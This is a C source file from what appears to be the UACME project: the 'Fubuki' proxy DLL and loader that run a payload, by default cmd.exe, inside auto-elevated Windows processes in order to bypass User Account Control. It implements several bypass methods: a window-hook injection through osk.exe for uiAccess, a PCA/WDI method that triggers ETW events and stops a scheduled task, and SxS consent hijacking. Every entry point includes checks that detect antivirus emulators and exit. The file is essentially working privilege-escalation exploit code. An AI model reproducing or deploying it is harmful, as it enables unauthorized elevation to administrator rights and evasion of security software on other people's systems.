/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2021
*
*  TITLE:       DLLMAIN.C
*
*  VERSION:     3.56
*
*  DATE:        16 July 2021
*
*  Proxy dll entry point.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "fubuki.h"
#include <evntprov.h>

UACME_PARAM_BLOCK g_SharedParams;
HANDLE g_SyncMutant = NULL;

/*
* WdiGetDiagnosticModuleInterfaceVersion
*
* Purpose:
*
* Stub for fake WDI exports.
*
*/
ULONG_PTR WINAPI WdiGetDiagnosticModuleInterfaceVersion(
    VOID
)
{
    OutputDebugString(L"[PCASTUB] WdiGetDiagnosticModuleInterfaceVersion called\r\n");
    return 1;
}

/*
* WdiStubGeneric
*
* Purpose:
*
* Stub for fake WDI exports.
*
*/
ULONG_PTR WINAPI WdiStubGeneric(
    ULONG_PTR UnusedParam1,
    ULONG_PTR UnusedParam2
)
{
    UNREFERENCED_PARAMETER(UnusedParam1);
    UNREFERENCED_PARAMETER(UnusedParam2);

    OutputDebugString(L"[PCASTUB] WdiStubGeneric called\r\n");
    return 0;
}

/*
* DummyFunc
*
* Purpose:
*
* Stub for fake exports.
*
*/
VOID WINAPI DummyFunc(
    VOID
)
{
}

/*
* DefaultPayload
*
* Purpose:
*
* Process parameter if exist or start cmd.exe and exit immediately.
*
*/
VOID DefaultPayload(
    VOID
)
{
    BOOL bSharedParamsReadOk;
    UINT ExitCode;
    PWSTR lpParameter;
    ULONG cbParameter;

    ucmDbgMsg(LoadedMsg);

    //
    // Read shared params block.
    //
    RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
    bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
    if (bSharedParamsReadOk) {
        ucmDbgMsg(L"Fubuki, ucmReadSharedParameters OK\r\n");

        lpParameter = g_SharedParams.szParameter;
        cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
    }
    else {
        ucmDbgMsg(L"Fubuki, ucmReadSharedParameters Failed\r\n");
        lpParameter = NULL;
        cbParameter = 0UL;
    }

    ucmDbgMsg(L"Fubuki, before ucmLaunchPayload\r\n");

    ExitCode = (ucmLaunchPayload(lpParameter, cbParameter) != FALSE);

    ucmDbgMsg(L"Fubuki, after ucmLaunchPayload\r\n");

    //
    // If this is default executable, show runtime info.
    //
    if ((lpParameter == NULL) || (cbParameter == 0)) {
        if (g_SharedParams.AkagiFlag == AKAGI_FLAG_TANGO)
            ucmQueryRuntimeInfo(FALSE);
    }

    //
    // Notify Akagi.
    //
    if (bSharedParamsReadOk) {
        ucmDbgMsg(L"Fubuki, completion\r\n");
        ucmSetCompletion(g_SharedParams.szSignalObject);
    }

    RtlExitUserProcess(ExitCode);
}

/*
* UiAccessMethodHookProc
*
* Purpose:
*
* Window hook procedure for UiAccessMethod
*
*/
LRESULT CALLBACK UiAccessMethodHookProc(
    _In_ int nCode,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam
)
{
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

/*
* UiAccessMethodPayload
*
* Purpose:
*
* Defines application context and either:
* - if fInstallHook set - installs windows hook for dll injection
* - run default payload in target app context
*
*/
VOID UiAccessMethodPayload(
    _In_ HINSTANCE hinstDLL,
    _In_ BOOL fInstallHook,
    _In_opt_ LPWSTR lpTargetApp
)
{
    LPWSTR lpFileName;
    HHOOK hHook;
    HOOKPROC HookProcedure;
    TOKEN_ELEVATION_TYPE TokenType = TokenElevationTypeDefault;
    WCHAR szModuleName[MAX_PATH + 1];

    RtlSecureZeroMemory(szModuleName, sizeof(szModuleName));
    if (GetModuleFileName(NULL, szModuleName, MAX_PATH) == 0)
        return;

    lpFileName = _filename(szModuleName);
    if (lpFileName == NULL)
        return;
   
    if (fInstallHook) {

        //
        // Check if we are in the required application context
        // Are we inside osk.exe?
        //
        if (_strcmpi(lpFileName, TEXT("osk.exe")) == 0) {
            HookProcedure = (HOOKPROC)GetProcAddress(hinstDLL, FUBUKI_WND_HOOKPROC); //UiAccessMethodHookProc
            if (HookProcedure) {
                hHook = SetWindowsHookEx(WH_CALLWNDPROC, HookProcedure, hinstDLL, 0);
                if (hHook) {
                    //
                    // Timeout to be enough to spawn target app.
                    //
                    Sleep(15000);
                    UnhookWindowsHookEx(hHook);
                }
            }
            RtlExitUserProcess(0);
        }
    }

    //
    // If target application name specified - check are we inside target app?
    //
    if (lpTargetApp) {
        if (_strcmpi(lpFileName, lpTargetApp) == 0) {
            DefaultPayload();
        }
    }
    else {
        //
        // Use any suitable elevated context.
        //
        if (ucmGetProcessElevationType(NULL, &TokenType)) {
            if (TokenType == TokenElevationTypeFull) {
                DefaultPayload();
            }
        }
    }
}

/*
* UiAccessMethodDllMain
*
* Purpose:
*
* Proxy dll entry point for uiAccess method.
* Need dedicated entry point because of additional code.
*
*/
BOOL WINAPI UiAccessMethodDllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    WCHAR szMMC[] = { L'm', L'm', L'c', L'.', L'e', L'x', L'e', 0 };
    UNREFERENCED_PARAMETER(lpvReserved);

    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
        RtlExitUserProcess('foff');
    }

    if (fdwReason == DLL_PROCESS_ATTACH) {
        UiAccessMethodPayload(hinstDLL, TRUE, szMMC);
    }

    return TRUE;
}

/*
* DllMain
*
* Purpose:
*
* Default proxy dll entry point.
*
*/
BOOL WINAPI DllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    UNREFERENCED_PARAMETER(hinstDLL);
    UNREFERENCED_PARAMETER(lpvReserved);

    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
        RtlExitUserProcess('foff');
    }

    if (fdwReason == DLL_PROCESS_ATTACH) {
        DefaultPayload();
    }

    return TRUE;
}

const ULONGLONG ZERO_VALUE = 0;

/*
* pcaEtwCall
*
* Purpose:
*
* Call etw write event.
*
*/
ULONG pcaEtwCall()
{
    WCHAR szDebug[200];
    CONST GUID providerGuid = { 0x0EEF54E71, 0x661, 0x422D, {0x9A, 0x98, 0x82, 0xFD, 0x49, 0x40, 0xB8, 0x20} };
    CONST EVENT_DATA_DESCRIPTOR eventUserData[3] = {
        {(UINT_PTR)&ZERO_VALUE, sizeof(ULONG)},
        {(UINT_PTR)&ZERO_VALUE, sizeof(ULONG)},
        {(UINT_PTR)NULL, 0}
    };

    EVENT_DESCRIPTOR eventDescriptor;
    ULONG status = 0;

    OutputDebugString(L"[PCALDR] pcaEtwCall\r\n");

    eventDescriptor.Id = 0x1F46;
    eventDescriptor.Version = 0;
    eventDescriptor.Channel = 0x11;
    eventDescriptor.Level = 4;
    eventDescriptor.Opcode = 0;
    eventDescriptor.Task = 0;
    eventDescriptor.Keyword = 0x4000000000000100;

    status = EtwEventWriteNoRegistration(
        &providerGuid,
        &eventDescriptor,
        3,
        (PEVENT_DATA_DESCRIPTOR)&eventUserData);

    _strcpy(szDebug, L"[PCALDR] EtwEventWriteNoRegistration(1):");
    ultohex(status, _strend(szDebug));
    _strcat(szDebug, TEXT("\r\n"));
    OutputDebugString(szDebug);

    if (status == ERROR_SUCCESS) {

        eventDescriptor.Id = 0x1F48;

        status = EtwEventWriteNoRegistration(
            &providerGuid,
            &eventDescriptor,
            3,
            (PEVENT_DATA_DESCRIPTOR)&eventUserData);

        _strcpy(szDebug, L"[PCALDR] EtwEventWriteNoRegistration(2):");
        ultohex(status, _strend(szDebug));
        _strcat(szDebug, TEXT("\r\n"));
        OutputDebugString(szDebug);

    }

    return status;
}

/*
* pcaStopWDI
*
* Purpose:
*
* Stop WDI task and exit loader.
*
*/
ULONG pcaStopWDI()
{
    HRESULT hr;
    NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;

    OutputDebugString(L"[PCALDR] pcaStopWDI\r\n");
    
    hr = CoInitializeEx(NULL, 
        COINIT_APARTMENTTHREADED | 
        COINIT_DISABLE_OLE1DDE |
        COINIT_SPEED_OVER_MEMORY);

    if (SUCCEEDED(hr)) {

        OutputDebugString(L"[PCALDR] CoInitializeEx success\r\n");

        ucmSleep(1000);

        if (ucmStopTaskByName(
            TEXT("Microsoft\\Windows\\WDI"),
            TEXT("ResolutionHost")))
        {
            OutputDebugString(L"[PCALDR] ucmStopTaskByName success\r\n");
            ntStatus = STATUS_SUCCESS;
        }

        CoUninitialize();

    }
    else {
        OutputDebugString(L"[PCALDR] CoInitializeEx failed\r\n");
    }

    return ntStatus;
}

/*
* EntryPointExeModePCAMethod
*
* Purpose:
*
* Entry point to be used in exe mode with PCA method ONLY.
*
*/
VOID WINAPI EntryPointExeModePCAMethod(
    VOID)
{
    ULONG rLen = 0, status = 0;
    LPCWSTR lpCmdline = GetCommandLine();
    WCHAR szLoaderParam[MAX_PATH + 1];
    WCHAR szDebug[MAX_PATH * 2];

    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
        RtlExitUserProcess('foff');
    }

    RtlSecureZeroMemory(szLoaderParam, sizeof(szLoaderParam));
    GetCommandLineParam(lpCmdline, 0, (LPWSTR)&szLoaderParam, MAX_PATH, &rLen);

    if (rLen) {

        _strcpy(szDebug, L"[PCALDR] Loader parameter: ");
        _strcat(szDebug, szLoaderParam);
        _strcat(szDebug, L"\r\n");
        OutputDebugString(szDebug);
        
        if (szLoaderParam[0] == TEXT('1')) {
            status = pcaEtwCall();
        }
        else if (szLoaderParam[0] == TEXT('2')) {
            status = pcaStopWDI();
        }
    }
    else {
        OutputDebugString(L"[PCALDR] Empty command line\r\n");
    }
   
    RtlExitUserProcess(status);
}

typedef struct _PCA_LOADER_BLOCK {
    ULONG OpResult;
    WCHAR szLoader[MAX_PATH + 1];
} PCA_LOADER_BLOCK, *PPCA_LOADER_BLOCK;

/*
* EntryPointDllPCAMethod
*
* Purpose:
*
* Entry point to be used in dll mode with PCA method ONLY.
*
*/
BOOL WINAPI EntryPointDllPCAMethod(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    BOOL bSharedParamsReadOk;
    PWSTR lpParameter;
    ULONG cbParameter;

    HANDLE hSharedSection = NULL;
    PCA_LOADER_BLOCK* pvLoaderBlock = NULL;

    NTSTATUS ntStatus;

    SIZE_T viewSize = PAGE_SIZE;

    HANDLE hSharedEvent = NULL;
    WCHAR szObjectName[256];
    WCHAR szName[128];
    WCHAR szLoaderCmdLine[2];
    WCHAR szLoader[MAX_PATH + 1];
    WCHAR szDebug[1000];

    UNICODE_STRING usName;
    OBJECT_ATTRIBUTES obja;

    PROCESS_INFORMATION processInfo;
    STARTUPINFO startupInfo;

    UNREFERENCED_PARAMETER(lpvReserved);

    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
        RtlExitUserProcess('f0ff');
    }

    if (fdwReason == DLL_PROCESS_ATTACH) {

        LdrDisableThreadCalloutsForDll(hinstDLL);

        OutputDebugString(L"[PCADLL] Entry\r\n");

        RtlSecureZeroMemory(&szName, sizeof(szName));
        ucmGenerateSharedObjectName(FUBUKI_PCA_SECTION_ID, szName);

        _strcpy(szDebug, L"[PCADLL] szName = ");
        _strcat(szDebug, szName);
        _strcat(szDebug, L" SessionId = ");
        ultostr(NtCurrentPeb()->SessionId, _strend(szDebug));
        _strcat(szDebug, L"\r\n");
        OutputDebugString(szDebug);

        hSharedSection = OpenFileMapping(FILE_MAP_WRITE, FALSE, szName);
        if (hSharedSection) {

            OutputDebugString(L"[PCADLL] OpenFileMapping success\r\n");

            ntStatus = NtMapViewOfSection(
                hSharedSection,
                NtCurrentProcess(),
                &pvLoaderBlock,
                0,
                PAGE_SIZE,
                NULL,
                &viewSize,
                ViewUnmap,
                MEM_TOP_DOWN,
                PAGE_READWRITE);

            if (NT_SUCCESS(ntStatus) && pvLoaderBlock) {

                RtlSecureZeroMemory(&szLoader, sizeof(szLoader));
                _strncpy(szLoader, MAX_PATH, pvLoaderBlock->szLoader, MAX_PATH);

                OutputDebugString(L"[PCADLL] NtMapViewOfSection success\r\n");

                RtlSecureZeroMemory(&szName, sizeof(szName));
                _strcpy(szObjectName, L"\\BaseNamedObjects\\");
                ucmGenerateSharedObjectName(FUBUKI_PCA_EVENT_ID, szName);
                _strcat(szObjectName, szName);

                RtlInitUnicodeString(&usName, szObjectName);
                InitializeObjectAttributes(&obja, &usName, OBJ_CASE_INSENSITIVE, NULL, NULL);

                if (NT_SUCCESS(NtOpenEvent(&hSharedEvent, EVENT_MODIFY_STATE, &obja))) {

                    OutputDebugString(L"[PCADLL] NtOpenEvent OK\r\n");

                    //
                    // Read shared params block.
                    //
                    RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
                    bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
                    if (bSharedParamsReadOk) {
                        OutputDebugString(L"[PCADLL] Shared parameters read OK\r\n");
                        lpParameter = g_SharedParams.szParameter;
                        cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
                    }
                    else {
                        OutputDebugString(L"[PCADLL] Shared parameters defaulted\r\n");
                        lpParameter = NULL;
                        cbParameter = 0UL;
                    }

                    //
                    // Reset windir environment variable.
                    //
                    SetEnvironmentVariable(T_WINDIR, USER_SHARED_DATA->NtSystemRoot);

                    //
                    // Run payload.
                    //
                    if (ucmLaunchPayload(lpParameter, cbParameter)) {
                        OutputDebugString(L"[PCADLL] Payload executed OK\r\n");
                        pvLoaderBlock->OpResult = FUBUKI_PCA_PAYLOAD_RUN;
                    }
                    else {
                        OutputDebugString(L"[PCADLL] Error during payload execution\r\n");
                    }

                    //
                    // Restart loader with "2" param.
                    //
                    RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));

                    startupInfo.cb = sizeof(startupInfo);

                    //
                    // Set loader command line.
                    //
                    szLoaderCmdLine[0] = TEXT('2');
                    szLoaderCmdLine[1] = 0;

                    if (CreateProcess(
                        szLoader,
                        szLoaderCmdLine,
                        NULL,
                        NULL,
                        FALSE,
                        CREATE_NO_WINDOW,
                        NULL,
                        NULL,
                        &startupInfo,
                        &processInfo))
                    {
                        OutputDebugString(L"[PCADLL] Loader run OK\r\n");

                        CloseHandle(processInfo.hThread);
                        CloseHandle(processInfo.hProcess);
                        pvLoaderBlock->OpResult |= FUBUKI_PCA_LOADER_RUN;
                    }
                    else {
                        OutputDebugString(L"[PCADLL] Error during loader execution\r\n");
                    }

                    NtSetEvent(hSharedEvent, NULL);
                    NtClose(hSharedEvent);
                    OutputDebugString(L"[PCADLL] Shared event signaled\r\n");

                    //
                    // Notify Akagi.
                    //
                    if (bSharedParamsReadOk) {
                        ucmSetCompletion(g_SharedParams.szSignalObject);
                    }

                }
                else {
                    OutputDebugString(L"[PCADLL] NtOpenEvent failed\r\n");
                }

                NtUnmapViewOfSection(NtCurrentProcess(), pvLoaderBlock);

            }
            else {
                OutputDebugString(L"[PCADLL] MapViewOfFile failed\r\n");
            }

            NtClose(hSharedSection);

        }
        else {
            OutputDebugString(L"[PCADLL] OpenFileMapping failed\r\n");
        }

    }

    return TRUE;
}

/*
* EntryPointExeMode
*
* Purpose:
*
* Entry point to be used in exe mode.
*
*/
VOID WINAPI EntryPointExeMode(
    VOID
)
{
    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
        RtlExitUserProcess('foff');
    }
    DefaultPayload();
}

/*
* EntryPointUIAccessLoader
*
* Purpose:
*
* Entry point to be used in exe mode.
*
*/
VOID WINAPI EntryPointUIAccessLoader(
    VOID
)
{
    ULONG r;
    WCHAR szParam[MAX_PATH * 2];

    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
        RtlExitUserProcess('foff');
    }

    if (GetCommandLineParam(GetCommandLine(), 0, szParam, MAX_PATH, &r)) {
        if (r > 0) {
            ucmUIHackExecute(szParam);
        }
    }
    RtlExitUserProcess(0);
}

/*
* EntryPointSxsConsent
*
* Purpose:
*
* Entry point to be used consent sxs method.
*
*/
BOOL WINAPI EntryPointSxsConsent(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    BOOL bSharedParamsReadOk;
    PWSTR lpParameter;
    ULONG cbParameter;

    UNREFERENCED_PARAMETER(lpvReserved);

    ucmDbgMsg(LoadedMsg);

    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED)
        RtlExitUserProcess('foff');


    if (fdwReason == DLL_PROCESS_ATTACH) {

        LdrDisableThreadCalloutsForDll(hinstDLL);

        //
        // Read shared params block.
        //
        RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
        bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
        if (bSharedParamsReadOk) {
            lpParameter = g_SharedParams.szParameter;
            cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
        }
        else {
            lpParameter = NULL;
            cbParameter = 0UL;
        }

        ucmLaunchPayloadEx(
            CreateProcessW,
            lpParameter,
            cbParameter);

        //
        // Notify Akagi.
        //
        if (bSharedParamsReadOk) {
            ucmSetCompletion(g_SharedParams.szSignalObject);
        }

    }
    return TRUE;
}
